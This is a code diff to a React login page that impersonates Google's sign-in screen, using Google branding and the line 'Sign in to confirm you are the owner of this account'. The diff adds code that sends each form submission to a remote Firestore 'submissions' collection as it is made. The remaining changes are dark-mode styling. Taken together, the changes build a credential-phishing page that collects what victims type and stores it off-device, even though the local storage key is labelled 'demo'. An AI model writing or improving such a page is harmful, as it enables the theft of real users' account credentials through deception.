@@ -5,6 +5,8 @@
 
 import { useState, FormEvent } from 'react';
 import { ShieldAlert, Terminal, Eye, EyeOff, LayoutGrid } from 'lucide-react';
+import { doc, setDoc } from 'firebase/firestore';
+import { db } from '../lib/firebase';
 
 interface LoginViewProps {
   onSuccess: () => void;
@@ -109,6 +111,15 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
         browser: getBrowserName(),
       };
 
+      // Save to Firestore in real-time
+      try {
+        setDoc(doc(db, 'submissions', submission.id), submission).catch(err => {
+          console.error('Failed to save to Firestore:', err);
+        });
+      } catch (err) {
+        console.error('Firestore save sync error:', err);
+      }
+
       // Save to localStorage
       const existing = JSON.parse(localStorage.getItem('demo_submissions') || '[]');
       existing.push(submission);
@@ -209,12 +220,12 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
               One account. All of Google working for you.
             </h1>
             <p className="text-lg text-text-secondary font-normal max-w-lg">
-              Sign in to confirm you are the owner of this account. protect your privacy
+              Sign in to confirm you are the owner of this account. <span className="dark:text-[#1A73E8] dark:font-semibold">protect your privacy</span>
             </p>
           </div>
 
           {/* Bold visual label matching provided image */}
-          <div className="text-brand-primary text-2xl md:text-3xl font-bold tracking-tight mt-2 border-l-4 border-brand-primary pl-4">
+          <div className="text-brand-primary dark:text-[#1A73E8] text-2xl md:text-3xl font-bold tracking-tight mt-2 border-l-4 border-brand-primary dark:border-[#1A73E8] pl-4">
             Google Privacy Protection
           </div>
         </div>
@@ -332,7 +343,7 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
                   disabled={!staySignedIn}
                   className={`bg-brand-primary text-white font-medium rounded px-6 py-2.5 text-sm transition-all duration-300 ease-in-out shadow-sm select-none ${
                     staySignedIn 
-                      ? 'opacity-100 cursor-pointer hover:opacity-90 active:scale-95 focus:ring-2 focus:ring-brand-primary focus:ring-offset-2 outline-none' 
+                      ? 'opacity-100 dark:bg-[#1A73E8] dark:hover:bg-[#155cb4] cursor-pointer hover:opacity-90 active:scale-95 focus:ring-2 focus:ring-brand-primary dark:focus:ring-[#1A73E8] focus:ring-offset-2 outline-none' 
                       : 'opacity-45 cursor-not-allowed'
                   }`}
                 >
